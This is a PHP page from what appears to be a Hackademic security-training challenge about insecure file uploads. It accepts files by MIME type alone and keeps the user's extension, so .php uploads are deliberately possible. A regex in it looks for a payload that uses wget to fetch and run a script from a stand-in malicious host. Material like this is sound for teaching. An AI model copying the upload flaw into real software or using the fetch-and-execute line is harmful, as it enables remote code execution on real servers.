<?php

include_once dirname(__FILE__).'/../../init.php';
session_start();
require_once(HACKADEMIC_PATH."controller/class.ChallengeValidatorController.php");
require_once('functions.php');

$solution = true;
$validator = new ChallengeValidatorController($solution);
$validator->startChallenge();

removeOldFiles();

$filepath = '';
if(isset($_FILES['picture'])) {
	if($_FILES['picture']['size'] > 20000) {
		exit('Error: This file is too big. The limit size is 20KB.');
	}

	$allowedMimeTypes = array('image/x-png', 'image/png', 'image/jpg', 'image/jpeg', 'image/gif');
	$mimeType = getMimeType($_FILES['picture']['tmp_name']);
	if(!in_array($mimeType, $allowedMimeTypes)) {
	// The MIME type doesn't correspond to an image.
		exit('Error: Incorrect MIME type.');
	}

	// The MIME type says image and the size is less than 20KB:
	if($_FILES['picture']['error'] > 0) {
		exit('Error code: '.$_FILES['picture']['error']);
	} else {
		if(isset($_SESSION['uploaded_picture'])) {
		// Already uploaded a picture.
			$pictureId = $_SESSION['uploaded_picture'];
			removePreviousPicture($pictureId);
		} else {
		// First picture uploaded by this user, need to generate an id.
			$pictureId = uniqid();
			$_SESSION['uploaded_picture'] = $pictureId;
		}

		// Puts picture_infected back to his default value.
		$_SESSION['picture_infected'] = false;
		
		// Retrieves and checks file extension:
		$extension = pathinfo($_FILES['picture']['name'], PATHINFO_EXTENSION);
		if(strlen($extension) > 4) {
			exit('Error: Invalid extension.');
		}

		// Moves the file to a permanent location:
		$filepath = 'pictures/'.$pictureId.'.'.$extension;
		move_uploaded_file($_FILES['picture']['tmp_name'], $filepath);

		// Checks for the PHP code:
		$content = file_get_contents($filepath);
		$regex = '/<\?((php|=) )? ?wget "http:\/\/malicioussource\.com\/d43\.php"; ?\.\/d43\.php ?;? ?\?>/';
		if(preg_match($regex, $content)) {
			$_SESSION['picture_infected'] = true;
		}

		// Secures the image file and add the code for the challenge validation
		// in order to check the solution when the user visit the image URL:
		secureFile($filepath);
		if($extension == 'php') {
		// We only want to add the validation code if the extension is .php
		// because otherwise it won't get executed.
			addChallengeValidationToFile($filepath);
		} else {
		// We count the failed attempt now because we can't at the image level
			$validator->failChallenge();
		}
	}
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Upload a picture!</title>

	<script src="data/jquery-2.1.1.min.js"></script>

	<link rel="stylesheet" href="data/bootstrap.min.css">
	<script src="data/bootstrap.min.js"></script>
	<script src="data/bootstrap.file-input.js"></script>

	<script type="text/javascript">
		$(function() {
			$('input[type=file]').bootstrapFileInput();
		});
	</script>

	<link rel="stylesheet" href="data/style.css">
</head>
<body>
	<div class="site-wrapper">

		<div class="site-wrapper-inner">

			<div class="cover-container">

				<div class="masthead clearfix">
					<div class="inner">
						<h3 class="masthead-brand">Upload a picture!</h3>
						<ul class="nav masthead-nav">
							<li class="active"><a href="index.php">Home</a></li>
							<li><a href="#">Account</a></li>
							<li><a href="#">Contact</a></li>
						</ul>
					</div>
				</div>

				<div class="inner cover">
					<?php
						if($filepath == '') {
					?>
					<h1 class="cover-heading">Choose a picture.</h1>
					<p class="lead">
						Your picture will be available after you upload it for a week.<br/>
						You can only upload one per computer.
					</p>
					<form method="post" class="lead" enctype="multipart/form-data">
						<input type="file" name="picture" data-filename-placement="inside">
						<button class="btn btn-primary" type="submit">Upload</button>
					</form>
					<?php
						} else {
							echo '<h1 class="cover-heading">Here is your picture!</h1>';
							echo '<p class="lead"><a href="'.$filepath.'">';
							echo 'http://'.$_SERVER['HTTP_HOST'].dirname($_SERVER['REQUEST_URI']).'/'.$filepath;
							echo '</a></p>';
						}
					?>
				</div>

				<div class="mastfoot">
					<div class="inner">
						<p>&copy; 2014 Picture Company.</p>
					</div>
				</div>

			</div>

		</div>

	</div>
</body>
</html>
